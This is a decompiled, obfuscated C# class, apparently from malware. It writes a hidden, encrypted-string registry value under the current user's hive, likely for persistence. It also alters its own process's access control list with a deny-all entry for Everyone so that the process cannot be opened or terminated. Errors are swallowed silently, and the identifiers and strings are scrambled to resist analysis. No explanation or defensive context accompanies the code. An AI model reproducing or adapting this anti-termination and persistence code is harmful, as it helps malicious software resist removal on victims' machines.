using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace igelRrgoft;

internal sealed class jVzvlUDeCcikx
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr uLWOuixWVWHSh, int TQXZNdKrDVkWy, [Out] byte[] ruudfbMMnrQkW, uint vUvLZZmeStuA, out uint wCtbbGBFASTrVP);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr nlArUakpWsLiiY, int VmjcotlksNkz, [In] byte[] YLSRcKtGsoUFMqJMg);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void hGJuAchpXUEh(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107406496)));
			registryKey.SetValue(DbQGfNcxACeJl.fZQJZGRivPka(getString_0(107406903)), getString_0(107407858));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor EFwnamyAQx(IntPtr intptr_0)
	{
		byte[] ruudfbMMnrQkW = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ruudfbMMnrQkW, 0u, out var wCtbbGBFASTrVP);
		if ((long)wCtbbGBFASTrVP > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ruudfbMMnrQkW = new byte[wCtbbGBFASTrVP], wCtbbGBFASTrVP, out wCtbbGBFASTrVP))
		{
			return null;
		}
		return new RawSecurityDescriptor(ruudfbMMnrQkW, 0);
	}

	private void NutZUmYVUBzVHM(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void JlFVUEIeNUAnaBe()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = EFwnamyAQx(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			NutZUmYVUBzVHM(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static jVzvlUDeCcikx()
	{
		Strings.CreateGetStringDelegate(typeof(jVzvlUDeCcikx));
	}
}
